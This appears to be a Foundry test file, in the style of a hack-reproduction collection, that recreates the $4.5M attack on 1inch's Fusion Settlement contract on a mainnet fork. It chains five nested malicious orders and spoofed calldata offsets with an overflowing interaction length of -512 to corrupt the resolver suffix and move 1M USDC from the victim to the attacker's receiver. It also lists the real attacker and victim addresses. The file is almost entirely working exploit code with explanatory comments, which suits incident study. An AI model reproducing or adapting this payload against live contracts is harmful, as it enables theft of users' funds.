// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "./../interface.sol";



// @KeyInfo - Total Lost : 4.5M
// Attacker : https://etherscan.io/address/0xA7264a43A57Ca17012148c46AdBc15a5F951766e
// Attack Contract : https://etherscan.io/address/0x019BfC71D43c3492926D4A9a6C781F36706970C9
// Vulnerable Contract : https://etherscan.io/address/0xa88800cd213da5ae406ce248380802bd53b47647
// Funds Receiver: https://etherscan.io/address/0xbbb587e59251d219a7a05ce989ec1969c01522c0
// Attack Tx : https://etherscan.io/tx/0x62734ce80311e64630a009dd101a967ea0a9c012fabbfce8eac90f0f4ca090d6

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xa88800cd213da5ae406ce248380802bd53b47647#code

// @Analysis
// Twitter Guy : https://x.com/DecurityHQ/status/1898069385199153610
// Post-mortem : https://blog.decurity.io/yul-calldata-corruption-1inch-postmortem-a7ea7a53bfd9

// @Relevant Repos
// How it works: https://web.archive.org/web/20230422045124/https://blog.1inch.io/fusion-swap-resolving-onchain-component/
//               https://blog.1inch.io/fusion-swap-resolving-the-offchain-component/
//               https://blog.1inch.io/fusion-mode-swap-resolving-45a9203f95e9/
// Settlement: https://github.com/1inch/fusion-protocol/blob/934a8e7db4b98258c4c734566e8fcbc15b818ab5/contracts/Settlement.sol
// Audit Limit: https://blog.openzeppelin.com/1inch-limit-order-protocol-audit
// Dedaub of Attacker contract: https://app.dedaub.com/ethereum/address/0x019bfc71d43c3492926d4a9a6c781f36706970c9/decompiled

// Attacker contract is not very important for this hack
// as it mostly relays the orders to the settlement contract
// it acts as a maker/taker for the orders
// We'll focus instead on the crafting of the orders calldata
interface IAttackerContract {
    // If attacker is also tx.origin, isValidSignature will return 0x1626ba7e (valid)
    function isValidSignature(bytes32 digest, bytes calldata signature) external view returns (bytes4);
    // For deployer of the attack contract only
    function transfer(address _from, address _to, uint256 _wad) external;
    // Start of the attack, just calls Settlement with orders
    function settle(bytes calldata orders) external;
    // Attacker preapproved to the router v5 so it can gather the wei used for the fake orders
    function approve(address _token, address _spender, uint256 _amount) external;
}

interface ISettlement {
    function settleOrders(bytes calldata order) external;
}

struct Order {
    uint256 salt;
    address makerAsset;
    address takerAsset;
    address maker;
    address receiver;
    address allowedSender;  // equals to Zero address on public orders
    uint256 makingAmount;
    uint256 takingAmount;
    uint256 offsets;
    // bytes makerAssetData;
    // bytes takerAssetData;
    // bytes getMakingAmount; // this.staticcall(abi.encodePacked(bytes, swapTakerAmount)) => (swapMakerAmount)
    // bytes getTakingAmount; // this.staticcall(abi.encodePacked(bytes, swapMakerAmount)) => (swapTakerAmount)
    // bytes predicate;       // this.staticcall(bytes) => (bool)
    // bytes permit;          // On first fill: permit.1.call(abi.encodePacked(permit.selector, permit.2))
    // bytes preInteraction;
    // bytes postInteraction;
    bytes interactions; // concat(makerAssetData, takerAssetData, getMakingAmount, getTakingAmount, predicate, permit, preIntercation, postInteraction)
}

contract ONEINCH is Test {
    uint256 blocknumToForkFrom = 21982110;

    address ATTACK_DEPLOYER = 0xA7264a43A57Ca17012148c46AdBc15a5F951766e;
    address ATTACK_CONTRACT = 0x019BfC71D43c3492926D4A9a6C781F36706970C9;
    address VICTIM = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5; // (TrustedVolumes)
    address FUNDS_RECEIVER = 0xBbb587E59251D219a7a05Ce989ec1969C01522C0;
    address SettlementAddr = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address AGGREGATION_ROUTER_V5 = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    bytes4 private constant _FILL_ORDER_TO_SELECTOR = 0xe5d7bde6; // IOrderMixin.fillOrderTo.selector
    bytes1 private constant _FINALIZE_INTERACTION = 0x01;


    function setUp() public {
        vm.createSelectFork("mainnet", blocknumToForkFrom);
        // Log balances of attacker contract pre-attack (needs very little to start the attack)
        console.log("Attacker Contract USDC Balance: ", TokenHelper.getTokenBalance(USDC, ATTACK_CONTRACT));
        console.log("Attacker Contract USDT Balance: ", TokenHelper.getTokenBalance(USDT, ATTACK_CONTRACT));

    }

    function testExploit() public {

        uint256 AMOUNT_TO_STEAL = 0xE8D4A51000; // 1M
        bytes1 _CONTINUE_INTERACTION = 0x00;

        // Beauty of abi encoding, discerning between a dynamic type that's bytes(0) (thus getting a dynamic offset),
        // and a static type inplace is not possible, so masquerading as a dynamic type
        // we spoof the offsets expected by fillOrderTo(order_, signature, interaction)
        uint256 FAKE_SIGNATURE_LENGTH_OFFSET = 0x240;
        uint256 FAKE_INTERACTION_LENGTH_OFFSET = 0x460;

        uint256 _PADDING = FAKE_INTERACTION_LENGTH_OFFSET - FAKE_SIGNATURE_LENGTH_OFFSET; // (544 bytes)
        bytes memory zeroBytes = new bytes(_PADDING); // Future place where our fake interaction will live after going back up FAKE_INTERACTION_LENGTH back in the calldata

        uint256 FAKE_INTERACTION_LENGTH = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00; // -512 in int
        //

        // Reminder: in normal conditions _settleOrder never shortens the payload, it only **appends** to it
        // But after the calldata copy in _settleOrder the huge FAKE_INTERACTION_LENGTH
        // will cause an overflow in the right operation of:
        // -> mstore(add(add(ptr, interactionLengthOffset), 4), add(interactionLength, suffixLength))
        // -> add(interactionLength, suffixLength) will be  == 0
        // So what it means is that it's setting our fake interactionLength to 0, cleanings the bytes

        // to write our payload **in the middle** of the copied calldata over our zeroBytes
        // Where exactly? The first overflow was to set the interactionLength to 0
        // The second overflow happens for the offset calculation
        // -> let offset := add(add(ptr, interactionOffset), interactionLength)
        //
        //   Low Memory (0x00)                                              High Memory (~0x1720 = 5920 bytes)
        //   │                                                                             │
        //   ├─────────────────────────────────────────────────────────────────────────────┤
        //   │          ... previously used memory (stack, local vars, etc.) ...           │
        //   ├─────────────────────────────────────────────────────────────────────────────┤◀─── ptr = 5920 bytes (0x1720)
        //   │                             [ ptr (0x1720) ]                                │
        //   │                      (start of new memory buffer)                           │
        //   ├─────────────────────────────────────────────────────────────────────────────┤
        //   │                                                                             │
        //   │          Copied calldata (Order struct, initial data, etc.)                 │
        //   │                                                                             │
        //   ├─────────────────────────────────────────────────────────────────────────────┤◀─── offset = 6560 bytes (0x19A0)
        //   │                                                                             │
        //   │      [ ⚠️ Overflows writing appended suffix data here (early!)  ⚠️ ]        │
        //   │                                                                             │
        //   │                   mstore(offset + 0x04, totalFee)                           │
        //   │                   mstore(offset + 0x24, resolver)                           │
        //   │                                                                             │
        //   ├─────────────────────────────────────────────────────────────────────────────┤◀─── ptr + interactionOffset (7072 bytes, 0x1BA0)
        //   │                                                                             │
        //   │             [ Interactions array should ideally start HERE! ]               │
        //   │                  (interactionOffset = 1152 bytes from ptr)                  │
        //   │                                                                             │
        //   ├─────────────────────────────────────────────────────────────────────────────┤◀─── ptr + interactionOffset + 480 = 7552 bytes (0x1D80)
        //   │                                                                             │
        //   │                  ... rest of appended suffix data (512 bytes) ...           │
        //   │                         [End of overflowed data]                            │
        //   ├─────────────────────────────────────────────────────────────────────────────┤
        //   │                                                                             │
        //   │                       Copied calldata with hand crafted (320 bytes)         │
        //   │                   (fillOrderTo bytes calldata interaction)                  │
        //   ├─────────────────────────────────────────────────────────────────────────────┤
        //   │                     ... a few 0 bytes now that they moved up ...            │
        //   └─────────────────────────────────────────────────────────────────────────────┘
        // It means we now control the END of the calldata, where we already wrote our fake suffix
        // with _FINALIZE_INTERACTION when crafting finalOrderInteraction below

        // Hand crafting our own suffix like _settleOrder would
        //           let offset := add(add(ptr, interactionOffset), interactionLength)
        // mstore(add(offset, 0x04), totalFee)
        // mstore(add(offset, 0x24), resolver)
        // mstore(add(offset, 0x44), calldataload(add(order, 0x40)))  // takerAsset
        // mstore(add(offset, 0x64), rateBump)
        // mstore(add(offset, 0x84), takingFeeData)
        // let tokensAndAmountsLength := mload(tokensAndAmounts)
        // memcpy(add(offset, 0xa4), add(tokensAndAmounts, 0x20), tokensAndAmountsLength)
        // mstore(add(offset, add(0xa4, tokensAndAmountsLength)), tokensAndAmountsLength)
        //}

        bytes memory interaction5;
        uint _AMOUNT_TO_STEAL = AMOUNT_TO_STEAL;
        
        {
        Order memory sixthOrder = Order(
            0, // salt
            USDT, // makerAsset
            USDC, // takerAsset USDC
            ATTACK_CONTRACT, // maker
            FUNDS_RECEIVER, // receiver
            SettlementAddr, // allowedSender
            1, // makingAmount
            AMOUNT_TO_STEAL, // takingAmount
            0, // offsets
            hex"" // interactions
        );
        bytes memory dynamicSuffix = abi.encode(0, VICTIM, USDC, 0, 0, USDC, _AMOUNT_TO_STEAL, 0x40); // What the resolver will use
        bytes memory suffixPadding = new bytes(23);
        bytes memory finalOrderInteraction =
            abi.encodePacked(SettlementAddr, _FINALIZE_INTERACTION, VICTIM, suffixPadding, dynamicSuffix);
        // When interaction5 is finally called back on a _settleOrder coming from V5Router::fillOrderTo->Settlement::fillOrderInteraction
        // suffixLength will be 512 (0x200), combined with
        interaction5 = abi.encodePacked(
            SettlementAddr,
            _CONTINUE_INTERACTION,
            abi.encode(
                sixthOrder,
                FAKE_SIGNATURE_LENGTH_OFFSET,
                FAKE_INTERACTION_LENGTH_OFFSET,
                0,
                _AMOUNT_TO_STEAL,
                0,
                ATTACK_CONTRACT
            ),
            zeroBytes,
            FAKE_INTERACTION_LENGTH,
            finalOrderInteraction
        );
        }
        
        bytes memory signature = hex"";

       // Order memory _fifthOrder = fifthOrder; // Stack to deep
        {

        Order memory fifthOrder = Order(
            0, // salt
            USDT, // makerAsset
            USDC, // takerAsset USDC
            ATTACK_CONTRACT, // maker
            ATTACK_CONTRACT, // receiver
            SettlementAddr, // allowedSender
            1, // makingAmount
            1, // takingAmount
            0, // offsets
            hex"" // interactions
        );
        // Ping pong to grow tokensAndAmounts.length ↑
        bytes memory interaction4 = abi.encodePacked(
            SettlementAddr,
            _CONTINUE_INTERACTION,
            abi.encode(fifthOrder, signature, interaction5, 0, 1, 0, ATTACK_CONTRACT)
        );

        bytes1 __CONTINUE_INTERACTION = 0x00;
        Order memory fourthOrder = Order(
            1, // salt
            USDT, // makerAsset
            USDC, // takerAsset USDC
            ATTACK_CONTRACT, // maker
            ATTACK_CONTRACT, // receiver
            SettlementAddr, // allowedSender
            1, // makingAmount
            1, // takingAmount
            0, // offsets
            hex"" // interactions
        );

        // Ping pong to grow tokensAndAmounts.length ↑
        bytes memory interaction3 = abi.encodePacked(
            SettlementAddr,
            __CONTINUE_INTERACTION,
            abi.encode(fourthOrder, signature, interaction4, 0, 1, 0, ATTACK_CONTRACT)
        );

        Order memory thirdOrder = Order(
            2, // salt
            USDT, // makerAsset
            USDC, // takerAsset USDC
            ATTACK_CONTRACT, // maker
            ATTACK_CONTRACT, // receiver
            SettlementAddr, // allowedSender
            1, // makingAmount
            1, // takingAmount
            0, // offsets
            hex"" // interactions
        );

        // Ping pong to grow tokensAndAmounts.length ↑
        bytes memory interaction2 = abi.encodePacked(
            SettlementAddr,
            __CONTINUE_INTERACTION,
            abi.encode(thirdOrder, signature, interaction3, 0, 1, 0, ATTACK_CONTRACT)
        );

        Order memory secondOrder = Order(
            3, // salt
            USDT, // makerAsset
            USDC, // takerAsset USDC
            ATTACK_CONTRACT, // maker
            ATTACK_CONTRACT, // receiver
            SettlementAddr, // allowedSender
            1, // makingAmount
            1, // takingAmount
            0, // offsets
            hex"" // interactions
        );

        // Ping pong to grow tokensAndAmounts.length ↑
        bytes memory interaction = abi.encodePacked(
            SettlementAddr,
            __CONTINUE_INTERACTION,
            abi.encode(secondOrder, signature, interaction2, 0, 1, 0, ATTACK_CONTRACT)
        );

        Order memory orderStruct = Order(
            4, // salt
            USDT, // makerAsset
            USDC, // takerAsset USDC
            ATTACK_CONTRACT, // maker
            ATTACK_CONTRACT, // receiver
            SettlementAddr, // allowedSender
            1, // makingAmount
            1, // takingAmount
            0, // offsets
            hex"" // interactions (empty)
        );

        // Final payload, will execute bottom up from interaction to interaction5 ↑
        bytes memory orderData = abi.encode(orderStruct, signature, interaction, 0, 1, 0, ATTACK_CONTRACT);
        
        vm.prank(ATTACK_DEPLOYER, ATTACK_DEPLOYER);

        // Finally call the attack contract with the crafted order
        ATTACK_CONTRACT.call(abi.encodeWithSignature("settle(bytes)", orderData));
        }

        uint256 balanceUSDCFundsReceiver = IUSDC(USDC).balanceOf(FUNDS_RECEIVER);
        console.log("Stolen %d USDC", balanceUSDCFundsReceiver);
    }
}
